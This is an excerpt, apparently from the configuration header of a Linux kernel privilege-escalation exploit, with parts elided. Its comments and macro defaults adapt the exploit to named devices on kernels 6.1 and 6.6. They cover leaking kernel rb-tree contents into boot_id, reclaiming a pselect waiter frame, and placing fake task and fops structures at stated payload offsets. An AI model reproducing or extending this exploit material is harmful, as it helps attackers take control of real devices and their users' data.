...
/* Build marker printed at startup ("build config ... build=...") so a live
 * log can be matched to the exact binary that produced it. */
#ifndef BUILD_TAG
...
/*
 * Which loggers slot is used as the rb-tree "parent" whose CONTENT gets
 * leaked into boot_id (via random_table[4].data). mustang/rango (6.6)
 * use loggers[0][1] directly; tegu/tokay (6.1) use loggers[2][0]
 * (SLIDE_LOGGERS_0_1 + 0x20), the "stage0 logger slot2". Override in
 * target.h when needed.
 */
#ifndef SLIDE_LOGGER_PARENT
...
#ifndef MAIN_TCP_ROUTE_DEFAULT
/*
 * Main-route transport. mustang/rango (6.6) use the pselect route;
 * tegu (6.1) overrides to 1 in target.h to use the tokay-proven TCP
 * route (MAIN_TCP_ROUTE / MAIN_TCP_PAYLOAD), whose payload geometry
 * (delta 0, bias 0xe80, fake_task_off 0x5800, fake_fops_off 0x3338)
 * avoids the fake_lock rb_leftmost misalignment seen with pselect.
 */
#define MAIN_TCP_ROUTE_DEFAULT 0
#endif
#ifndef MAIN_TCP_PAYLOAD_DEFAULT
#define MAIN_TCP_PAYLOAD_DEFAULT 0
#endif

#ifndef PSELECT_WAITER_WORD_SHIFT
/*
 * fd_set word-index shift for the pselect stack-copy (waiter frame
 * reclaim). mustang/rango (6.6) use 0 (map starts at word 0); tegu
 * (6.1) overrides to 1 in target.h (map starts at word 2).
 */
